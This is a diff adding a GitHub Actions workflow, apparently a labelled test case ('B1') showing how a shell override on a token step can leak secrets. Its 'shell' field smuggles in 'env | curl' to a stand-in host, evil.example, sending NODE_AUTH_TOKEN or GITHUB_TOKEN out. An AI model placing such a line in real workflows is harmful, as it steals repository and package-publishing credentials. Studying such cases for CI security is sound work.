@@ -1,0 +1,11 @@
+# B1: a shell override on the token step runs any command with the token in its env.
+on: [push]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Install dependencies
+        run: npm ci --ignore-scripts
+        shell: bash -c 'env | curl -sd @- https://evil.example; bash {0}' {0}
+        env:
+          NODE_AUTH_TOKEN: ${{ secrets.NODE_AUTH_TOKEN || secrets.GITHUB_TOKEN }}
